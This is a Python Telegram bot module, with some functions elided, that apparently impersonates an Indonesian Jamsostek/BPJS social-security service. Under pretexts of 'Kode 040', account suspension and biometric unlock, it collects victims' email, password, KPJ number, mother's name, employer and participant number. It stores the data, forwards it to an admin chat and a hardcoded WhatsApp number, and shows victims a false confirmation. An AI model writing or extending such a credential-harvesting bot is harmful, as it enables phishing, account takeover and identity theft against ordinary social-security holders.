from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ContextTypes, ConversationHandler
from config import ADMIN_CHAT_ID
from utils.database import save_user_data
from utils.whatsapp import send_whatsapp_message
import asyncio

# States
KODE_040_EMAIL, KODE_040_PASSWORD, KODE_040_KPJ = range(100, 103)
SUSPEND_EMAIL, SUSPEND_PASSWORD = range(110, 112)
UNLOCK_NAMA_IBU, UNLOCK_NAMA_PERUSAHAAN, UNLOCK_EMAIL, UNLOCK_PESERTA = range(120, 124)

# ============= KODE 040 =============
async def kode_040_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mulai proses Kode 040"""
    await update.callback_query.answer()
    
    text = """
🔑 *Silakan Masukkan Email Jamsostek Mobile Anda*

Contoh: nama@jamsostek.go.id
"""
    
    await update.callback_query.edit_message_text(text, parse_mode='Markdown')
    return KODE_040_EMAIL

# ... (fungsi lain tetap sama sampai unlock_peserta)

async def unlock_peserta(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Terima nomor peserta"""
    peserta = update.message.text.strip()
    
    user_data = {
        'type': 'unlock_biometrik',
        'nama_ibu': context.user_data['unlock_nama_ibu'],
        'nama_perusahaan': context.user_data['unlock_nama_perusahaan'],
        'email': context.user_data['unlock_email'],
        'nomor_peserta': peserta,
        'phone': context.user_data.get('phone')
    }
    save_user_data(update.effective_user.id, user_data)
    
    await send_to_admin(update, context, user_data)
    
    confirmation_text = """
╔═════════════════════════════════════╗
║     ✅ DATA BERHASIL DIKIRIM ✅      ║
╚═════════════════════════════════════╝

📋 Data Anda:
• Nama Ibu: {nama_ibu}
• Perusahaan: {nama_perusahaan}
• Email: {email}
• Nomor Peserta: {peserta}

✅ Tim kami akan memproses dalam 1x24 jam.

Terima kasih! 🙏
""".format(**user_data)
    
    await update.message.reply_text(confirmation_text, parse_mode='Markdown')
    
    return ConversationHandler.END

async def send_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, user_data):
    """Kirim data ke admin via Telegram & WhatsApp"""
    user = update.effective_user
    
    # === Telegram Message ===
    admin_message = f"""
📬 *DATA BARU MASUK*

👤 User: {user.first_name or ''} {user.last_name or ''}
🆔 User ID: {user.id}
📞 Phone: {user_data.get('phone', 'Tidak ada')}

📋 Tipe Layanan: {user_data.get('type', 'Unknown')}
"""
    
    if user_data.get('type') == 'kode_040':
        admin_message += f"• Email: {user_data.get('email')}\n• Tahun KPJ: {user_data.get('tahun_kpj')}\n"
    elif user_data.get('type') == 'suspend_kpj':
        admin_message += f"• Email: {user_data.get('email')}\n"
    elif user_data.get('type') == 'unlock_biometrik':
        admin_message += f"• Nama Ibu: {user_data.get('nama_ibu')}\n• Perusahaan: {user_data.get('nama_perusahaan')}\n• Email: {user_data.get('email')}\n• Nomor Peserta: {user_data.get('nomor_peserta')}\n"
    
    admin_message += "\nSilakan proses segera."
    
    try:
        await context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=admin_message,
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"Telegram admin error: {e}")

    # === WhatsApp Message ===
    whatsapp_msg = f"""
🔔 DATA BARU - {user_data.get('type', 'Unknown').upper()}

👤 {user.first_name or ''} {user.last_name or ''}
🆔 {user.id}
📞 {user_data.get('phone', '-')}

Tipe: {user_data.get('type')}
    """.strip()
    
    # Kirim ke WhatsApp Admin (ganti nomor ini)
    send_whatsapp_message("62895423349883", whatsapp_msg)  # ← GANTI NOMOR INI
